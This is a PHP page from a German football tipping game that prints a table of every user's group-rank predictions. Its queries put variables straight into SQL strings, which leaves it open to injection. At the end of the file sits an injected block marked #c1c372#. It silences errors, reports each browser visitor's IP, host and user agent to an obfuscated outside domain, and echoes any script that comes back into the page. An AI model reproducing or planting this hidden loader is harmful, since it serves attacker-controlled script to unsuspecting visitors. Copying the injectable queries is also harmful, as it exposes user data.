<?php
session_start();
$userId=$_GET["userId"];
if(strlen($userId)==0)
{
	header("Location: ../util/login.php5");
	exit;
}
echo "<html>";
echo "<head>";
echo "<title>EM-Tipp - Tipps ALL USERS (Germany)</title>";
echo "</head>";
echo "<body>";
include_once("../../connection/dbaccess.php5");
include_once("../../general/log/log.php5");
include_once("../util/calc.php5");
include_once("../util/dbutil.php5");
include_once("../util/dbschema.php5");

$log=new viewlogger();
$log->info("clicked showAllUsersGroupRankTipps.php5");


printGroupRanks();


function getUserInfo($username){
	$tableusers=dbschema::users;
	$sql="SELECT * from $tableusers WHERE username='$username'";
	$resultUser=mysql_query($sql);
	$array=mysql_fetch_array($resultUser);
	$firstname=$array["firstname"];
	$lastname=$array["lastname"];
	return "$firstname $lastname";
}

function printGroupRanks(){
	
	echo "<h3>Gruppenplatzierungen</h3>";
	$table_groupranktipps=dbschema::groupranktipps;
	$table_teams=dbschema::teams;
	$sql="SELECT * FROM $table_groupranktipps g, $table_teams t WHERE t.shortname = g.team AND g.user='Mayoar' ORDER BY t.group, g.team";
	$sqlResult=mysql_query($sql);
	
	echo "<table border='1' rules='all'>";
	echo "<tr>";
	echo "<th>Gruppe</th> ";
	while($array=mysql_fetch_array($sqlResult)){
		
		$group = $array["group"];
		echo "<th align='center'> $group </th>";
	}
	echo "</tr>";
	echo "<tr>";
	echo "<th>  Team </th>";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		$teamName=$array["team"];
		echo "<td align='center'>&nbsp; $teamName &nbsp;</td>";
	}
	echo "</tr>";
	
	$table_users=dbschema::users;
	$sql="SELECT * FROM $table_users t ORDER BY lastname,firstname";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		echo "<tr>";
		printGroupRanksForUser($array["username"]);
		echo "</tr>";
	}
	echo "</table>";
}
function printGroupRanksForUser($username){
	
	$table_groupranktipps=dbschema::groupranktipps;
	$table_teams=dbschema::teams;
	echo "<tr>";
	echo "<td>" . getUserInfo($username) . "</td>";
	$sql="SELECT * FROM $table_groupranktipps g, $table_teams t WHERE g.user='$username' AND t.shortname = g.team ORDER BY t.group, g.team";
	$sqlResult=mysql_query($sql);
	while($array=mysql_fetch_array($sqlResult)){
		
		$group = $array["group"];
		$teamName=$array["team"];
		$tippRank=$array["rank"];
		echo "<td align='center'>$tippRank</td>";
	}
	echo "</tr>";
}

?>
<?php
#c1c372#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/c1c372#
?>
